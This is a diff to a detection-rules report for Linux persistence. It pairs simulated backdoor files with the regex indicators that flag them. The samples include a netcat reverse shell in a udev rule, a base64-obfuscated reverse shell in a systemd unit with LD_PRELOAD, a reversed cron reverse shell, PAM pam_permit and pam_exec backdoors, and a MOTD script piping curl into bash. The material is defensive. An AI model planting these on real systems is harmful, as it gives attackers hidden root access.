@@ -15,8 +15,8 @@ ACTION=="add", ENV{CMD}="nc -e /bin/bash 10.0.0.1 4444", RUN+="/bin/sh -c 'eval 
 ```
 
 **Matched Indicators (`rules.json`):**
-* `eval\s+(\$env|%E)\{` — **MEDIUM** (*Udev macro substitution evasion*)
-* `nc\s+-e` — **CRITICAL** (*Reverse shell attempt via netcat*)
+* `eval\s+(\$env|%E)\{` — **MEDIUM** (*Udev macro substitution evasion attempt detected in extracted payload*)
+* `\bnc\s+-e` — **CRITICAL** (*Reverse shell attempt using netcat with execution flag*)
 
 **PoC Evidence:**
 
@@ -36,7 +36,7 @@ Description=System Security Monitor
 
 [Service]
 Type=simple
-Environment="LD_PRELOAD=/tmp/libhook.so"
+Environment="LD_PRELOAD=/tmp/.libhook.so"
 ExecStart=/bin/bash -c 'echo "bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMC4xIDQ0NDQ=" | base64 -d | bash'
 Restart=always
 
@@ -46,9 +46,9 @@ WantedBy=multi-user.target
 
 **Matched Indicators (`rules.json`):**
 * `LD_PRELOAD` — **CRITICAL** (*Shared library preloading injection*) - *Triggered via Environment field*
-* `(/tmp|/dev/shm|/var/tmp|/run/user)/[a-zA-Z0-9._-]+` — **HIGH** (*Execution from temporary directory*) - *Triggered via Environment field*
-* `\|\s*bash` — **HIGH** (*Piping raw remote stream directly into Bash shell execution*) - *Triggered via ExecStart field*
-* `base64\s+(-d|--decode)` — **HIGH** (*Base64 decoding invocation, often used to conceal malicious commands.*) - *Triggered via ExecStart field*
+* `(/tmp|/dev/shm|/var/tmp|/run/user)/\.[a-zA-Z0-9_-]+` — **HIGH** (*Direct execution of hidden script or binary from non-standard temporary directories.*) - *Triggered via Environment field*
+* `base(64|32)\s+(-d|--decode)\s*\|\s*(ba|z|k|da)?sh` — **CRITICAL** (*Base64/32 decoding invocation piped directly into a shell interpreter.*) - *Triggered via ExecStart field*
+* `\|\s*(ba|z|k|da)?sh` — **LOW** (*Piping raw remote stream directly into shell execution*) - *Triggered via ExecStart field*
 
 **PoC Evidence:**
 
@@ -63,16 +63,16 @@ WantedBy=multi-user.target
 **Simulated File:** `root_cron`
 
 ```cron
-* * * * * root echo "4444 1.0.0.01 hsab/nib/ cn" | rev | bash
-@reboot root echo "/dev/shm/payload.sh" | at now + 1 minute
+* * * * * root echo "4444 1.0.0.01 hsab/nib/ e- cn" | rev | bash
+@reboot root echo "/dev/shm/.payload.sh" | at now + 1 minute
 ```
 
 **Matched Indicators (`rules.json`):**
-* `rev\s*\|\s*(ba)?sh` — **CRITICAL** (*Reversed command string piped directly into shell*)
-* `\|\s*at\s+(now|[0-9:a-zA-Z+]+)` — **MEDIUM** (*Scheduling one-off tasks via 'at' daemon*)
-* `@reboot` — **HIGH** (*Startup schedule directive*)
-* `(/tmp|/dev/shm|/var/tmp|/run/user)/[a-zA-Z0-9._-]+` — **HIGH** (*Execution from temporary directory*)
-* `\|\s*bash` — **HIGH** (*Piping raw remote stream directly into Bash shell execution*) - *Triggered via ExecStart field*
+* `rev\s*\|\s*(ba|z|k|da)?sh` — **CRITICAL** (*Reversed command string piped directly into a shell interpreter.*)
+* `\|\s*at\s+(now|[0-9:a-zA-Z+]+)` — **MEDIUM** (*Scheduling one-off tasks via 'at' daemon to break process tree visibility*)
+* `@reboot` — **HIGH** (*Non-standard schedule directive: Executes payload automatically on system startup*)
+* `(/tmp|/dev/shm|/var/tmp|/run/user)/\.[a-zA-Z0-9_-]+` — **HIGH** (*Direct execution of hidden script or binary from non-standard temporary directories.*)
+* `\|\s*(ba|z|k|da)?sh` — **LOW** (*Piping raw remote stream directly into shell execution*)
 
 **PoC Evidence:**
 
@@ -93,9 +93,9 @@ session    optional     pam_exec.so /dev/shm/.harvest.sh
 ```
 
 **Matched Indicators (`rules.json`):**
-* `auth\s+sufficient\s+pam_permit\.so` — **CRITICAL** (*PAM authentication bypass backdoor*)
+* `auth\s+.*pam_permit\.so` — **CRITICAL** (*PAM authentication bypass backdoor*)
 * `pam_exec\.so` — **HIGH** (*Execution of external commands during PAM authentication*)
-* `(/tmp|/dev/shm|/var/tmp|/run/user)/[a-zA-Z0-9._-]+` — **HIGH** (*Execution from temporary directory*)
+* `(/tmp|/dev/shm|/var/tmp|/run/user)/\.[a-zA-Z0-9_-]+` — **HIGH** (*Direct execution of hidden script or binary from non-standard temporary directories.*)
 
 **PoC Evidence:**
 
@@ -105,17 +105,19 @@ session    optional     pam_exec.so /dev/shm/.harvest.sh
 
 ## PoC 5: MOTD Dynamic Script Execution Persistence
 
-**Vector:** Attackers place executable scripts into `/etc/update-motd.d/` that stealthily fetch and execute remote payloads with root permissions whenever any user logs in via SSH or interactive terminal.
+**Vector:** Attackers place executable scripts into `/etc/update-motd.d/` that stealthily fetch and execute remote fileless payloads bypassing SSL verification and directly piping to the shell.
 
 **Simulated File:** `99-backdoor`
 
 ```bash
 #!/bin/sh
-curl -s http://10.0.0.1/update.sh 
+curl -s -k https://10.0.0.1/update.sh | bash
 ```
 
 **Matched Indicators (`rules.json`):**
-* `curl\s+-s` — **HIGH** (*Silent HTTP request via curl*)
+* `\bcurl\s+.*\|\s*(ba|z|k|da)?sh` — **CRITICAL** (*Silent HTTP request via curl piped directly to a shell (Fileless payload execution)*)
+* `\bcurl\s+.*-(k|-insecure)` — **HIGH** (*HTTP request via curl with SSL/TLS verification disabled*)
+* `\|\s*(ba|z|k|da)?sh` — **LOW** (*Piping raw remote stream directly into shell execution*)
 
 **PoC Evidence:**
 
